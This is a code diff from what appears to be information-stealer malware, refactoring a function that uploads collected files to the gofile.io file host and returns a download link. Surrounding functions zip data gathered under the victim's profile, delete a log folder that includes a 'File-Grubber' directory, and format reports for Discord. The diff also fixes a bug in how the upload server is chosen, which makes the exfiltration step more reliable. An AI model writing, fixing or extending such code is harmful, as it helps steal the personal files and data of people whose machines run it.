@@ -9,21 +9,18 @@ from preferences.config import config
 
 def upload_file_to_gofile(file_path):
     try:
-        server = get("https://api.gofile.io/servers")
-        if server.status_code == 200:
-            servers = server.json()["data"]["servers"]
-            server = servers[randint(0, len(servers))]
-            response = post(f'https://{server}.gofile.io/contents/uploadfile', files={'file': open(file_path, 'rb')})
-            if response.status_code == 200:
-                return response.json()["data"]["downloadPage"]
-            else:
-                Log(f"gofile(upload) ---> {response}")
-            return None
-        else:
-            Log(f"gofile(get server) ---> {server}")
-    except Exception as e:
-        Log(f"gofile ---> {e}")
-        return None
+        servers_get = get("https://api.gofile.io/servers")
+        if servers_get.status_code == 200: servers = servers_get.json()["data"]["servers"]
+        else: raise Exception("Failed to get servers")
+
+        if len(servers) == 0: raise Exception("No server is available to upload")
+
+        server = servers[randint(0, len(servers) - 1)]
+        response = post(f'https://{server}.gofile.io/contents/uploadfile', files={'file': open(file_path, 'rb')})
+        if response.status_code == 200: return response.json()["data"]["downloadPage"]
+        else: raise Exception("Failed to upload file")
+        
+    except Exception as e: Log(f"gofile(error) ---> {e}")
 
 def MakeZip(user):
     Temp = environ['USERPROFILE'] + sep + r'AppData\Local\Temp'
@@ -49,11 +46,11 @@ def MakeZip(user):
         return None
 
 
-def Clean(user):
+def Clean(user) -> None:
     rmtree(f'{user}\\{config.pathToLogs}\\Files\\File-Grubber', ignore_errors=True)
     rmtree(f'{user}\\{config.pathToLogs}', ignore_errors=True)
 
-def MsgForDiscord(message, url):
+def MsgForDiscord(message, url) -> str:
     message = message.replace('<b>', '**')
     message = message.replace('</b>', '**')
     message = message.replace('<code>', '`')
